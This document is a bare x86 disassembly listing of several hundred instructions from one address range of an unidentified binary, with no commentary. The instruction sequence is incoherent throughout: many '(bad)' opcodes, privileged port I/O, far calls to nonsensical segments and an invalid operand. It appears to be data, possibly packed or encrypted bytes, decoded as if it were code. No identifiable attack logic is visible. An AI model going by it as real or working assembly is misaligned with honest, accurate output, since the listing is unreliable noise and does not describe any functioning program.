  40be8b:	mov    ds:0xee64da02,al
  40be90:	ror    DWORD PTR [edi+0x4c],0xd6
  40be94:	aad    0x90
  40be96:	aaa    
  40be97:	sub    DWORD PTR [ebp-0x38cdb1ca],esp
  40be9d:	cmc    
  40be9e:	test   DWORD PTR [edi+0xb],edi
  40bea1:	inc    esp
  40bea2:	iret   
  40bea3:	outs   dx,DWORD PTR ds:[esi]
  40bea4:	inc    ebp
  40bea5:	pushf  
  40bea6:	cmp    al,BYTE PTR [ecx+0x48]
  40bea9:	dec    esi
  40beaa:	shld   edx,ecx,0x12
  40beae:	cmp    eax,0x641f3f31
  40beb3:	call   0x85a520bb
  40beb8:	dec    esp
  40beb9:	mov    esi,0x9a6bed56
  40bebe:	in     al,0xb7
  40bec0:	sbb    eax,0x6fc50816
  40bec5:	ret    
  40bec6:	mov    BYTE PTR [esi+0x9],cl
  40bec9:	arpl   WORD PTR ds:0x5b23c45d,di
  40becf:	(bad)  
  40bed0:	(bad)  
  40bed2:	xchg   ebp,eax
  40bed3:	or     BYTE PTR [edx],bh
  40bed5:	push   ds
  40bed6:	mov    ch,0x0
  40bed8:	sub    ebp,DWORD PTR [edx-0x14]
  40bedb:	fcomp  DWORD PTR [esi+0x16]
  40bede:	pushf  
  40bedf:	cmp    ebp,0x31
  40bee2:	lds    ebx,FWORD PTR [eax]
  40bee4:	cmp    edi,DWORD PTR [edx]
  40bee6:	(bad)  
  40bee7:	test   DWORD PTR ss:[edx+0x4b75796a],ecx
  40beee:	jecxz  0x40bee4
  40bef0:	push   0x182f76a4
  40bef5:	cli    
  40bef6:	(bad)  [edx-0x19]
  40bef9:	inc    esi
  40befa:	or     esp,DWORD PTR [ecx+0x7f]
  40befd:	fbstp  TBYTE PTR [esi-0xf5b332c]
  40bf03:	jg     0x40bed6
  40bf05:	cmovb  ebx,DWORD PTR [edi+0x75166154]
  40bf0c:	lahf   
  40bf0d:	test   DWORD PTR [eax+0x5faa1711],ecx
  40bf13:	xchg   ebx,eax
  40bf14:	dec    ebp
  40bf15:	int    0x12
  40bf17:	ror    cl,0x28
  40bf1a:	in     eax,0xb5
  40bf1c:	sbb    BYTE PTR [edi+0x30d6ba9c],al
  40bf22:	aas    
  40bf23:	dec    esp
  40bf24:	add    ebp,eax
  40bf26:	inc    edx
  40bf27:	int    0xe4
  40bf29:	and    al,0x99
  40bf2b:	idiv   BYTE PTR [edx]
  40bf2d:	dec    eax
  40bf2e:	xchg   bl,bh
  40bf30:	push   es
  40bf31:	shl    DWORD PTR [edi],cl
  40bf33:	dec    edi
  40bf34:	xor    eax,0x66531968
  40bf39:	xchg   ecx,eax
  40bf3a:	dec    esp
  40bf3b:	fadd   QWORD PTR [edi]
  40bf3d:	fadd   QWORD PTR [ebp+eax*2+0xe73ee55]
  40bf44:	xchg   edi,eax
  40bf45:	sbb    cl,BYTE PTR [eax+0x672794e2]
  40bf4b:	out    dx,al
  40bf4c:	sbb    BYTE PTR [ebx+eax*1],bl
  40bf4f:	jnp    0x40bfc0
  40bf51:	jns    0x40bfa5
  40bf53:	arpl   WORD PTR [ebp+0x4771855d],sp
  40bf59:	gs dec ebx
  40bf5b:	sti    
  40bf5c:	out    dx,eax
  40bf5d:	sub    al,0x1d
  40bf5f:	pop    ds
  40bf60:	sahf   
  40bf61:	fdivp  st(3),st
  40bf63:	div    DWORD PTR [ebp+0x1b42949]
  40bf69:	in     al,0xdf
  40bf6b:	loopne 0x40bf93
  40bf6d:	push   ss
  40bf6e:	lods   eax,DWORD PTR ds:[esi]
  40bf6f:	mov    ecx,0x26e221d
  40bf74:	push   ebp
  40bf75:	loopne 0x40bf65
  40bf77:	icebp  
  40bf78:	sbb    DWORD PTR [eax+0x1],0xffffff86
  40bf7c:	xor    DWORD PTR [ebx],esi
  40bf7e:	(bad)  
  40bf80:	pop    edi
  40bf81:	mov    edx,0x7e90f97f
  40bf86:	jle    0x40bfb5
  40bf88:	dec    ebp
  40bf89:	ins    DWORD PTR es:[edi],dx
  40bf8a:	adc    DWORD PTR [esi-0xe6b78bd],ebp
  40bf90:	fsub   st(7),st
  40bf92:	pushf  
  40bf93:	inc    ebp
  40bf94:	outs   dx,BYTE PTR ds:[esi]
  40bf95:	sub    edi,DWORD PTR [esi+0x39]
  40bf98:	(bad)  
  40bf99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf9a:	push   ebp
  40bf9b:	jecxz  0x40c00e
  40bf9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf9e:	test   eax,0x5c136a94
  40bfa3:	or     ecx,DWORD PTR [esi+0x4b]
  40bfa6:	test   eax,0x4f3c4af
  40bfab:	lahf   
  40bfac:	adc    BYTE PTR [ecx+edi*2],cl
  40bfaf:	sub    eax,DWORD PTR [edi+0x31]
  40bfb2:	mov    ebx,0x56a45d63
  40bfb7:	mov    bl,bl
  40bfb9:	mov    ebx,0x59b44ec
  40bfbe:	mov    esi,0x8a620265
  40bfc3:	sti    
  40bfc4:	and    esi,esp
  40bfc6:	popa   
  40bfc7:	inc    esp
  40bfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc9:	sbb    eax,0x9e83cfb
  40bfce:	stos   DWORD PTR es:[edi],eax
  40bfcf:	or     edx,ecx
  40bfd1:	fnstsw WORD PTR [ebx]
  40bfd3:	nop
  40bfd4:	int    0x69
  40bfd6:	outs   dx,BYTE PTR ds:[esi]
  40bfd7:	xlat   BYTE PTR ds:[ebx]
  40bfd8:	mov    dh,0x57
  40bfda:	loopne 0x40bfd8
  40bfdc:	sbb    al,0x45
  40bfde:	xlat   BYTE PTR ds:[ebx]
  40bfe0:	xchg   edx,eax
  40bfe1:	cmp    DWORD PTR [edx],edx
  40bfe3:	outs   dx,BYTE PTR ds:[esi]
  40bfe4:	jp     0x40c003
  40bfe6:	and    eax,0x3f3fae9
  40bfeb:	ret    
  40bfec:	out    0x2d,eax
  40bfee:	std    
  40bfef:	fdiv   st(0),st
  40bff1:	pop    ss
  40bff2:	pop    ebx
  40bff3:	push   ecx
  40bff4:	sti    
  40bff5:	add    eax,0x95f499a4
  40bffa:	out    dx,eax
  40bffb:	(bad)  
  40bffc:	jecxz  0x40bfa2
  40bffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfff:	leave  
  40c000:	loopne 0x40c044
  40c002:	in     eax,dx
  40c003:	xchg   esi,eax
  40c004:	mov    eax,ds:0x5b69ac58
  40c009:	neg    ecx
  40c00b:	ds mov esp,0x9f79cfee
  40c011:	xchg   esi,eax
  40c012:	xchg   edx,eax
  40c013:	push   esp
  40c014:	cmp    BYTE PTR [ebp+0x26],ah
  40c017:	pop    ebx
  40c018:	push   eax
  40c019:	stc    
  40c01a:	pop    ebx
  40c01b:	fs inc edx
  40c01d:	adc    bl,BYTE PTR [ebx-0x2dce9a51]
  40c023:	add    cl,bl
  40c025:	data16 in al,dx
  40c027:	inc    esp
  40c028:	fcmove st,st(1)
  40c02a:	dec    edi
  40c02b:	mov    ebx,0x89c98e95
  40c030:	sub    ecx,DWORD PTR [eax+edx*1]
  40c033:	arpl   WORD PTR [eax-0x238b9cdf],cx
  40c039:	(bad)  
  40c03a:	sar    BYTE PTR [ecx],0x47
  40c03d:	in     eax,dx
  40c03e:	jle    0x40c052
  40c040:	push   ebp
  40c041:	inc    esi
  40c042:	push   eax
  40c043:	or     al,0xc8
  40c045:	push   DWORD PTR [eax-0x4f]
  40c048:	sub    dl,BYTE PTR ss:0x742aae32
  40c04f:	out    0x13,eax
  40c051:	fisub  WORD PTR [esi-0x2a]
  40c054:	scas   eax,DWORD PTR es:[edi]
  40c055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c056:	xor    al,0xec
  40c058:	inc    ecx
  40c059:	cwde   
  40c05a:	(bad)  
  40c05b:	mov    ebx,0xbac7c273
  40c060:	mov    edx,0x407fd82a
  40c065:	cli    
  40c066:	xor    eax,0xaf493c21
  40c06b:	ds lahf 
  40c06d:	mov    eax,ds:0xdd6e7e77
  40c072:	call   0x9d12bd2e
  40c077:	mov    bl,0x92
  40c079:	adc    BYTE PTR [ecx-0x1ffe0b6a],dh
  40c07f:	ds pop esi
  40c081:	je     0x40c02c
  40c083:	int3   
  40c084:	jg     0x40c02f
  40c086:	sbb    al,ah
  40c088:	push   ebx
  40c089:	out    0x3b,al
  40c08b:	jl     0x40c057
  40c08d:	sti    
  40c08e:	mov    dh,BYTE PTR [ebx-0x724d88a5]
  40c094:	scas   eax,DWORD PTR es:[edi]
  40c095:	xlat   BYTE PTR ds:[ebx]
  40c096:	imul   esi,DWORD PTR [edi+0x0],0xb60eb5ad
  40c09d:	jae    0x40c053
  40c09f:	push   ecx
  40c0a0:	pop    ecx
  40c0a1:	push   ecx
  40c0a2:	cwde   
  40c0a3:	in     al,0xdd
  40c0a5:	xchg   BYTE PTR [edi-0x44],ah
  40c0a8:	and    eax,0x8167a0a9
  40c0ad:	ins    BYTE PTR es:[edi],dx
  40c0ae:	test   BYTE PTR [ecx],bl
  40c0b0:	iret   
  40c0b1:	pop    edx
  40c0b2:	mov    esi,0x5f72eb99
  40c0b7:	(bad)  
  40c0b8:	sbb    esi,DWORD PTR ds:[eax]
  40c0bb:	in     eax,0xe6
  40c0bd:	xchg   edx,eax
  40c0be:	xchg   edx,eax
  40c0bf:	jp     0x40c060
  40c0c1:	pop    ebp
  40c0c2:	dec    esi
  40c0c3:	cmp    al,0xe
  40c0c5:	icebp  
  40c0c6:	xchg   esp,eax
  40c0c7:	lods   al,BYTE PTR ds:[esi]
  40c0c8:	inc    esi
  40c0c9:	test   BYTE PTR [edx+0x739d12ed],ah
  40c0cf:	scas   al,BYTE PTR es:[edi]
  40c0d0:	ret    
  40c0d1:	pop    edx
  40c0d2:	dec    edx
  40c0d3:	loop   0x40c111
  40c0d5:	sub    BYTE PTR [ecx],dh
  40c0d7:	sbb    al,0x15
  40c0d9:	adc    esi,ebp
  40c0db:	cdq    
  40c0dc:	dec    ecx
  40c0dd:	pop    ebp
  40c0de:	rol    DWORD PTR ds:0xc3a6ac9d,0x84
  40c0e5:	scas   al,BYTE PTR es:[edi]
  40c0e6:	in     eax,dx
  40c0e7:	mov    esi,0xad770aaa
  40c0ec:	add    BYTE PTR [edi-0x766ac794],dh
  40c0f2:	jp     0x40c0c4
  40c0f4:	and    BYTE PTR [esp+eax*4+0x1c113638],cl
  40c0fb:	mov    bl,0x69
  40c0fd:	frstor [esi+0x4c84b4da]
  40c103:	repnz icebp 
  40c105:	jp     0x40c098
  40c107:	dec    ebx
  40c108:	mov    ds:0x51c792b2,eax
  40c10d:	cs push eax
  40c10f:	fwait
  40c110:	mov    al,0x14
  40c112:	pusha  
  40c113:	jne    0x40c0f1
  40c115:	outs   dx,BYTE PTR ds:[esi]
  40c116:	mov    edi,0x98140e66
  40c11b:	mov    edx,0xdc8b5b97
  40c120:	xchg   ecx,eax
  40c121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c122:	sti    
  40c123:	stos   BYTE PTR es:[edi],al
  40c124:	neg    BYTE PTR [eax-0x49e22d90]
  40c12a:	clc    
  40c12b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c12c:	mov    ebp,ecx
  40c12e:	push   ecx
  40c12f:	or     dh,0xb1
  40c132:	sbb    DWORD PTR [edx+0x2e],0xffffff8a
  40c136:	stos   BYTE PTR es:[edi],al
  40c137:	adc    dl,BYTE PTR [ecx-0x71]
  40c13a:	xchg   ebp,eax
  40c13b:	ins    BYTE PTR es:[edi],dx
  40c13c:	clc    
  40c13d:	fs call 0xcab1:0x9c232250
  40c145:	dec    edx
  40c146:	sub    eax,0xc008f0cc
  40c14b:	sub    al,0xbd
  40c14d:	jns    0x40c117
  40c14f:	aad    0x58
  40c151:	call   0xd408:0xc887b956
  40c158:	cld    
  40c159:	iret   
  40c15a:	out    0x87,eax
  40c15c:	push   esi
  40c15d:	inc    eax
  40c15e:	cdq    
  40c15f:	sub    eax,0x4b96866d
  40c164:	shl    DWORD PTR [ebx],cl
  40c166:	fcomp  st(5)
  40c168:	test   BYTE PTR [ebx-0x28],cl
  40c16b:	xchg   esi,eax
  40c16c:	xor    al,0x1e
  40c16e:	push   ecx
  40c16f:	gs ins BYTE PTR es:[edi],dx
  40c171:	nop
  40c172:	test   eax,0x911a1935
  40c177:	or     al,0x86
  40c179:	shr    BYTE PTR [edx*8+0x6115ebc2],1
  40c180:	jmp    0xa331:0xa2170e2a
  40c187:	dec    ebp
  40c188:	popa   
  40c189:	adc    ch,BYTE PTR [esi]
  40c18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c18c:	and    eax,0x5386525c
  40c191:	dec    ebx
  40c192:	fbld   TBYTE PTR [ebx+edi*4]
  40c195:	fwait
  40c196:	push   edi
  40c197:	push   cs
  40c198:	push   edi
  40c199:	jb     0x40c1be
  40c19b:	push   ecx
  40c19c:	mov    bl,0xb8
  40c19e:	or     ch,BYTE PTR [edi-0xd0a7e8f]
  40c1a4:	mov    ebp,0x9f85b671
  40c1a9:	push   ds
  40c1aa:	jle    0x40c1b2
  40c1ac:	pop    esp
  40c1ad:	aam    0x56
  40c1af:	fcomp  DWORD PTR [edi]
  40c1b1:	mov    ecx,0x5ed89046
  40c1b6:	xor    ah,BYTE PTR [ebx-0x7c]
  40c1b9:	mov    dh,0x93
  40c1bb:	inc    ebx
  40c1bc:	add    eax,0xcedaa10a
  40c1c1:	fcmovbe st,st(7)
  40c1c3:	xchg   dl,cl
  40c1c5:	(bad)  
  40c1c6:	jle    0x40c234
  40c1c8:	shr    DWORD PTR [edx-0x45],1
  40c1cb:	dec    esi
  40c1cc:	ficom  DWORD PTR [esi]
  40c1ce:	push   ds
  40c1cf:	inc    ebx
  40c1d0:	out    dx,al
  40c1d1:	das    
  40c1d2:	adc    esp,0x9aa9fa2a
  40c1d8:	push   cs
  40c1d9:	sub    al,0x6
  40c1db:	test   al,0x4e
  40c1dd:	mov    ch,BYTE PTR [edi+eax*2+0x6f]
  40c1e1:	test   dh,cl
  40c1e3:	ins    BYTE PTR es:[edi],dx
  40c1e4:	push   esi
  40c1e5:	in     eax,dx
  40c1e6:	cmp    ecx,eax
  40c1e8:	sub    eax,DWORD PTR [edx-0x6d8ae3a2]
  40c1ee:	cs (bad) 
  40c1f0:	cmp    eax,0xb71307aa
  40c1f5:	jno    0x40c193
  40c1f7:	sub    esi,DWORD PTR ds:0xa3b8116
  40c1fd:	adc    eax,0x88285824
  40c202:	xchg   esi,eax
  40c203:	push   ebp
  40c204:	xchg   cl,ch
  40c206:	xor    al,0xd6
  40c208:	xor    edx,DWORD PTR [esi-0x7650456c]
  40c20e:	cdq    
  40c20f:	mov    ebx,0x1b499766
  40c214:	in     al,dx
  40c215:	jnp    0x40c1a9
  40c217:	and    eax,0x9d6892ec
  40c21c:	inc    ebp
  40c21d:	xchg   ebp,eax
  40c21e:	jo     0x40c1be
  40c220:	imul   esp,eax,0x2dcf4a9e
  40c226:	add    eax,0x4051be79
  40c22b:	(bad)  
  40c22c:	arpl   ax,bx
  40c22e:	popa   
  40c22f:	mov    ah,0xb6
  40c231:	into   
  40c232:	sbb    al,ch
  40c234:	mov    esi,0x153ef0b6
  40c239:	jb     0x40c1ea
  40c23b:	xor    DWORD PTR [esi-0x61a62e5c],esi
  40c241:	jle    0x40c1d6
  40c243:	inc    ebp
  40c244:	mov    eax,0xed92f3d0
  40c249:	idiv   DWORD PTR [edi+0x4d0d3a2f]
  40c24f:	push   0x58
  40c251:	repnz mov eax,ds:0xc5c5e197
  40c257:	je     0x40c237
  40c259:	or     al,ah
  40c25b:	cmp    dh,bh
  40c25d:	rcl    BYTE PTR [ecx-0x40],0x51
  40c261:	mov    eax,ds:0xf3163a05
  40c266:	test   eax,0x7e3bc679
  40c26b:	push   esi
  40c26c:	adc    eax,0xae3a3bca
  40c271:	pop    ebx
  40c272:	dec    edx
  40c273:	popf   
  40c274:	cmc    
  40c275:	fisttp QWORD PTR [edx+edi*1+0x8]
  40c279:	out    dx,al
  40c27a:	mov    DWORD PTR [esi+0x7],ebx
  40c27d:	push   cs
  40c27e:	mov    eax,ds:0xa48a7e66
  40c283:	mov    ebp,0xeacd3d1
  40c288:	hlt    
  40c289:	std    
  40c28a:	int3   
  40c28b:	cmc    
  40c28c:	mov    ch,0xab
  40c28e:	pop    ebx
  40c28f:	cmp    bh,bl
  40c291:	dec    ecx
  40c292:	bound  ecx,QWORD PTR [eax-0x6a]
  40c295:	sbb    al,0xe
  40c297:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40c299:	loope  0x40c2b1
  40c29b:	push   esp
  40c29c:	jge    0x40c317
  40c29e:	xor    BYTE PTR [esi+0x714dfaaf],0x9b
  40c2a5:	mov    dh,0x52
  40c2a7:	ret    0xa5c9
  40c2aa:	les    edx,FWORD PTR [edi]
  40c2ac:	mov    esi,0xc8c9740f
  40c2b1:	push   ds
  40c2b2:	sbb    bh,BYTE PTR [eax-0x52db0bb]
  40c2b8:	loop   0x40c2b6
  40c2ba:	xor    DWORD PTR [edx],esp
  40c2bc:	jp     0x40c247
  40c2be:	push   ds
  40c2bf:	ins    BYTE PTR es:[edi],dx
  40c2c0:	leave  
  40c2c1:	mov    eax,ds:0x2003c4a0
  40c2c6:	fild   WORD PTR [ecx-0x69]
  40c2c9:	aad    0x1b
  40c2cb:	mov    ah,0x2f
  40c2cd:	mov    edi,0xf6776888
  40c2d2:	jle    0x40c322
  40c2d4:	push   ecx
  40c2d5:	xor    eax,0x35374e8f
  40c2da:	mov    esi,DWORD PTR [ebp-0x3c]
  40c2dd:	fsubr  DWORD PTR [ecx-0xba4a4f7]
  40c2e3:	inc    esp
  40c2e4:	sbb    al,0xb
  40c2e6:	out    dx,al
  40c2e7:	or     al,0xa7
  40c2e9:	pop    edx
  40c2ea:	fdiv   st(1),st
  40c2ec:	xchg   edi,eax
  40c2ed:	cmp    esp,DWORD PTR [ecx-0x2b]
  40c2f0:	addr16 into 
  40c2f2:	pop    eax
  40c2f3:	fbstp  TBYTE PTR [edx]
  40c2f5:	mov    eax,0x64178be2
  40c2fa:	sar    bh,1
  40c2fc:	add    ebx,edi
  40c2fe:	push   ds
  40c2ff:	lock dec ebp
  40c301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c302:	and    bl,BYTE PTR [edx-0x44]
  40c305:	pop    ecx
  40c306:	pop    ebp
  40c307:	mov    ebp,0xbcb6227f
  40c30c:	dec    esp
  40c30d:	mov    ebx,0x78972989
  40c312:	call   0x3008:0x44f7acb0
  40c319:	adc    bl,ah
  40c31b:	adc    ah,ah
  40c31d:	ds leave 
  40c31f:	xchg   esi,eax
  40c320:	loopne 0x40c2f4
  40c322:	mov    esi,0xaa4f8726
  40c327:	adc    DWORD PTR [ecx+edx*4+0x4577a656],ebp
  40c32e:	mov    bh,dh
  40c330:	mov    eax,ebp
  40c332:	push   eax
  40c333:	dec    ebx
  40c334:	imul   edi,DWORD PTR [ebp-0x68],0x47
  40c338:	mov    bl,0x40
  40c33a:	cld    
  40c33b:	ficom  WORD PTR [edx]
  40c33d:	mov    BYTE PTR [edi+0x37519944],dl
  40c343:	jecxz  0x40c31b
  40c345:	cmp    ah,BYTE PTR [ebx+edi*1+0x64]
  40c349:	sbb    BYTE PTR [eax-0x6b],dh
  40c34c:	repnz loope 0x40c3b8
  40c34f:	ins    DWORD PTR es:[edi],dx
  40c350:	xchg   ecx,eax
  40c351:	outs   dx,DWORD PTR ds:[esi]
  40c352:	fist   WORD PTR ds:0x1d6e30f3
  40c358:	(bad)  
  40c35a:	xchg   ebx,eax
  40c35b:	dec    ebp
  40c35c:	mov    DWORD PTR [ecx],ecx
  40c35e:	clc    
  40c35f:	pop    ds
  40c360:	rol    BYTE PTR [ebx+0x60],1
  40c363:	jmp    0xf09eefb0
  40c368:	inc    ebx
  40c369:	lods   al,BYTE PTR ds:[si]
  40c36b:	mov    ecx,0x5691c843
  40c370:	test   al,0xa
  40c372:	fmul   st(0),st
  40c374:	sti    
  40c375:	in     eax,0x24
  40c377:	jl     0x40c39c
  40c379:	jl     0x40c354
  40c37b:	fsubr  st,st(0)
  40c37d:	stos   DWORD PTR es:[edi],eax
  40c37e:	pop    ebx
  40c37f:	ins    DWORD PTR es:[edi],dx
  40c380:	lods   al,BYTE PTR ds:[esi]
  40c381:	sub    al,0x84
  40c383:	bound  esi,QWORD PTR [ebp-0x677bbc57]
  40c389:	and    al,0x3e
  40c38b:	and    BYTE PTR [ebx+0xdb0d467],0xdb
  40c392:	push   eax
  40c393:	scas   eax,DWORD PTR es:[edi]
  40c394:	add    BYTE PTR [edi-0x693c585f],cl
  40c39a:	mov    ebx,es
  40c39c:	icebp  
  40c39d:	add    BYTE PTR [ebp-0x116c8545],al
  40c3a3:	cmp    eax,0x6cd1f2b0
  40c3a8:	aaa    
  40c3a9:	shl    esp,cl
  40c3ab:	inc    edx
  40c3ac:	cmp    DWORD PTR [edx-0x25bf1057],esi
  40c3b2:	cs jg  0x40c36b
  40c3b5:	mov    es,edi
  40c3b7:	retf   
  40c3b8:	fadd   QWORD PTR [ecx+0x2210b136]
  40c3be:	jl     0x40c38f
  40c3c0:	fstp   DWORD PTR [edi+0x1]
  40c3c3:	leave  
  40c3c4:	pop    ebp
  40c3c5:	cmp    al,0x24
  40c3c7:	adc    BYTE PTR [ecx+0x5a],al
  40c3ca:	stos   BYTE PTR es:[edi],al
  40c3cb:	aas    
  40c3cc:	cs mov bl,0x60
  40c3cf:	jecxz  0x40c3d2
  40c3d1:	mov    edi,0x5aa41e82
  40c3d6:	dec    ebp
  40c3d7:	leave  
  40c3d8:	sbb    ch,BYTE PTR [ebp+0x7fabbcd0]
  40c3de:	imul   DWORD PTR [ecx+0x1b0fd720]
  40c3e4:	add    eax,edx
  40c3e6:	push   0x7db21b12
  40c3eb:	cmp    eax,DWORD PTR [ebx+0xd]
  40c3ee:	push   eax
  40c3ef:	xor    esi,DWORD PTR [edx+0xd2013d6]
  40c3f5:	and    al,dh
  40c3f7:	pop    esi
  40c3f8:	dec    ebx
  40c3f9:	loope  0x40c428
  40c3fb:	add    ebx,DWORD PTR [esi-0x3b66d1fb]
  40c401:	add    bh,dh
  40c403:	cmp    ebp,ebx
  40c405:	lods   eax,DWORD PTR ds:[esi]
  40c406:	push   ecx
  40c407:	shl    BYTE PTR [ebx+edx*8],1
  40c40a:	das    
  40c40b:	add    BYTE PTR ds:0x8d1a96a4,al
  40c411:	adc    DWORD PTR [ebx],eax
  40c413:	in     al,dx
  40c414:	loope  0x40c3f5
  40c416:	ss ror al,0x58
  40c41a:	and    DWORD PTR [ebp+0x66f13b12],edi
  40c420:	adc    ah,BYTE PTR [esi]
  40c422:	adc    bh,ch
  40c424:	pop    ss
  40c425:	xchg   al,bl
  40c427:	cwde   
  40c428:	mov    ?,WORD PTR [ebp-0x196ca2af]
  40c42e:	imul   ecx,ebx,0x6a
  40c431:	cmp    ecx,eax
  40c433:	(bad)  
  40c434:	pop    ebp
  40c435:	inc    bp
  40c437:	test   eax,0xe0a60dfc
  40c43c:	push   esi
  40c43d:	push   ebx
  40c43e:	call   0xa114:0x48befed0
  40c445:	or     edx,esp
  40c447:	jb     0x40c42b
  40c449:	sub    DWORD PTR [edi],ebp
  40c44b:	add    cl,BYTE PTR [esi+0x4a]
  40c44e:	loope  0x40c463
  40c450:	pop    ss
  40c451:	rcr    bh,cl
  40c453:	imul   DWORD PTR ds:0xd210beb8
  40c459:	mov    eax,ds:0xc3155665
  40c45e:	aas    
  40c45f:	sahf   
  40c460:	lods   al,BYTE PTR ds:[esi]
  40c461:	mov    dl,0x8
  40c463:	cmp    dh,ch
  40c465:	mov    ds:0x56189c0e,eax
  40c46a:	sub    ecx,edi
  40c46c:	(bad)  
  40c46d:	aaa    
  40c46e:	ins    DWORD PTR es:[edi],dx
  40c46f:	into   
  40c470:	aad    0xea
  40c472:	jne    0x40c439
  40c474:	xor    eax,0x6132b501
  40c479:	xor    eax,0xa484c9ee
  40c47e:	dec    esp
  40c47f:	dec    ebp
  40c480:	adc    eax,DWORD PTR [eax-0xdc3b69d]
  40c486:	mov    al,BYTE PTR [ebp+0x7e]
  40c489:	cmc    
  40c48a:	(bad)  
  40c48b:	ja     0x40c495
  40c48d:	jnp    0x40c4a1
  40c48f:	mov    dh,0x6d
  40c491:	jge    0x40c50c
  40c493:	dec    ecx
  40c494:	push   0x5e
  40c496:	inc    ebx
  40c497:	push   esi
  40c498:	pop    ss
  40c499:	push   ebx
  40c49a:	add    DWORD PTR [ecx-0x3e],esp
  40c49d:	das    
  40c49e:	and    al,0x2c
  40c4a0:	bnd jne 0x40c477
  40c4a3:	sub    al,0xd3
  40c4a5:	fiadd  WORD PTR [edi]
  40c4a7:	out    dx,al
  40c4a8:	dec    eax
  40c4a9:	dec    esi
  40c4aa:	test   eax,0x1ac4e077
  40c4b0:	jno    0x40c437
  40c4b2:	jns    0x40c486
  40c4b4:	ja     0x40c4de
  40c4b6:	in     al,0x20
  40c4b8:	jecxz  0x40c529
  40c4ba:	mov    es,WORD PTR [edx+0x5f970284]
  40c4c0:	jo     0x40c4da
  40c4c2:	imul   esp,DWORD PTR [edx+0x2559ce62],0xffffffa8
  40c4c9:	push   edx
  40c4ca:	scas   al,BYTE PTR es:[edi]
  40c4cb:	pop    edi
  40c4cc:	pop    ss
  40c4cd:	jmp    0xe884:0xadd44463
  40c4d4:	stos   DWORD PTR es:[edi],eax
  40c4d5:	ins    BYTE PTR es:[edi],dx
  40c4d6:	xchg   edx,eax
  40c4d7:	enter  0x2259,0xb9
  40c4db:	out    dx,eax
  40c4dc:	sbb    DWORD PTR [esi-0x4b],ecx
  40c4df:	out    dx,eax
  40c4e0:	xchg   ebp,eax
  40c4e1:	ds call 0xcfed:0xcaa989cd
  40c4e9:	mov    cs,esp
  40c4eb:	jo     0x40c483
  40c4ed:	mov    ds:0xdf95ad23,al
  40c4f2:	fcom   QWORD PTR [edx+ebx*2-0x39ab8e18]
  40c4f9:	jo     0x40c4f9
  40c4fb:	shl    ebx,cl
  40c4fd:	hlt    
  40c4fe:	add    al,BYTE PTR [ecx]
  40c500:	lods   al,BYTE PTR ds:[esi]
  40c501:	mov    esi,edx
  40c503:	push   ss
  40c504:	inc    ecx
  40c505:	and    al,0x3b
  40c507:	sub    BYTE PTR [esi+0x5df97320],dl
  40c50d:	cdq    
  40c50e:	add    edi,DWORD PTR [ecx+0x5a]
  40c511:	inc    ebp
  40c512:	mov    edi,0xdbfe28d3
  40c517:	shl    esp,0x4f
  40c51a:	js     0x40c56c
  40c51c:	ja     0x40c4e2
  40c51e:	bound  esi,QWORD PTR [ebx]
  40c520:	push   edx
  40c521:	(bad)  
  40c522:	mov    edi,0xee493699
  40c527:	push   eax
  40c528:	lock jmp 0x6a6b8adb
  40c52e:	sahf   
  40c52f:	adc    dl,BYTE PTR [ebp+0x305f1b14]
  40c535:	xchg   edi,eax
  40c536:	sbb    ecx,DWORD PTR [esi+0x2d47d62b]
  40c53c:	sbb    edx,DWORD PTR [eax-0x3498da32]
  40c542:	outs   dx,BYTE PTR ds:[esi]
  40c543:	jae    0x40c597
  40c545:	dec    ebx
  40c546:	mov    ah,0xe0
  40c548:	mov    bl,dl
  40c54a:	xor    DWORD PTR [edx-0x5e],ebp
  40c54d:	fwait
  40c54e:	push   0xffffffb4
  40c550:	iret   
  40c551:	sar    dl,0x72
  40c554:	outs   dx,DWORD PTR ds:[esi]
  40c555:	sti    
  40c556:	lea    ecx,[eax-0x57aa8792]
  40c55c:	sub    bl,0xc9
  40c55f:	clc    
  40c560:	jmp    0x40c4e7
  40c562:	add    esi,ebx
  40c564:	inc    ecx
  40c565:	sub    ebp,DWORD PTR [ebx-0x80]
  40c568:	mov    ah,0xdf
  40c56a:	and    al,0xa
  40c56c:	aam    0x5b
  40c56e:	or     ebx,DWORD PTR [edx-0xaeff877]
  40c574:	les    edi,FWORD PTR [ebx+eiz*4-0x15]
  40c578:	aas    
  40c579:	mov    eax,edi
  40c57b:	dec    esi
  40c57c:	imul   ebp,esi,0x3ec15618
  40c582:	adc    ecx,ecx
  40c584:	add    DWORD PTR [ebx],edi
  40c586:	imul   edi,DWORD PTR [ecx],0x6161557a
  40c58c:	scas   al,BYTE PTR es:[edi]
  40c58d:	jnp    0x40c58c
  40c58f:	sbb    al,0x6d
  40c591:	sbb    eax,0xffffff95
  40c594:	(bad)  
  40c595:	jae    0x40c519
  40c597:	cld    
  40c598:	mov    ah,0x8a
  40c59a:	sub    cl,BYTE PTR [edx-0x24]
  40c59d:	loopne 0x40c61c
  40c59f:	cdq    
  40c5a0:	les    eax,FWORD PTR [ebx]
  40c5a2:	in     al,dx
  40c5a3:	mov    ecx,0xc201e69d
  40c5a9:	popf   
  40c5aa:	mov    ds:0x4eb1f74f,eax
  40c5af:	sbb    BYTE PTR [edi-0x542031b6],ah
  40c5b5:	lock repnz bound ecx,QWORD PTR ds:0x17a40769
  40c5bd:	mov    cl,BYTE PTR [ebx]
  40c5bf:	loop   0x40c57e
  40c5c1:	adc    DWORD PTR [esi+0x51],0xca1d5675
  40c5c8:	pushf  
  40c5c9:	mov    cl,0xca
  40c5cb:	add    eax,0x817b10c9
  40c5d0:	fistp  QWORD PTR [esi-0x416a4f69]
  40c5d6:	(bad)  
  40c5d7:	cwde   
  40c5d8:	jmp    0x2979526f
  40c5dd:	fidiv  DWORD PTR [edx-0x31]
  40c5e0:	jmp    0x40c580
  40c5e2:	xchg   esp,eax
  40c5e3:	cmp    ch,BYTE PTR [edx]
  40c5e5:	mov    bl,0x14
